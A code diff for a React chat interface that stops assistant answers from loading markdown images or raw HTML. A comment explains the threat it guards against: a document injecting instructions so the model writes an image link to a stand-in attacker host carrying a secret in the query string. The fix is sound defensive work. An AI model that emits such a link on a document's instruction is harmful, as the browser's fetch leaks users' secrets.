@@ -1,5 +1,5 @@
 import { useEffect, useRef, useState, type FormEvent, type KeyboardEvent } from "react"
-import ReactMarkdown from "react-markdown"
+import ReactMarkdown, { type Components } from "react-markdown"
 import remarkGfm from "remark-gfm"
 import {
   ArrowUp,
@@ -143,6 +143,13 @@ function StepsPanel({ message }: { message: Message }) {
   )
 }
 
+// Answers never load images or render raw HTML: a document could tell the model to
+// write ![](https://attacker/?q=<secret>), and the browser would send it on its own.
+// An image shows as its alt text instead.
+const ANSWER_MARKDOWN: Components = {
+  img: ({ alt }) => (alt ? <span className="text-muted-foreground">[{alt}]</span> : null),
+}
+
 function AssistantMessage({ message }: { message: Message }) {
   const reply = message.reply
   return (
@@ -161,7 +168,9 @@ function AssistantMessage({ message }: { message: Message }) {
                 : "max-w-none text-sm leading-relaxed [&_a]:underline [&_li]:my-0.5 [&_ol]:list-decimal [&_ol]:pl-5 [&_p]:my-2 [&_ul]:list-disc [&_ul]:pl-5"
             }
           >
-            <ReactMarkdown remarkPlugins={[remarkGfm]}>{message.text}</ReactMarkdown>
+            <ReactMarkdown remarkPlugins={[remarkGfm]} skipHtml components={ANSWER_MARKDOWN}>
+              {message.text}
+            </ReactMarkdown>
             {message.streaming && (
               <span className="ml-0.5 inline-block h-4 w-1.5 translate-y-0.5 animate-pulse rounded-sm bg-foreground/60" />
             )}
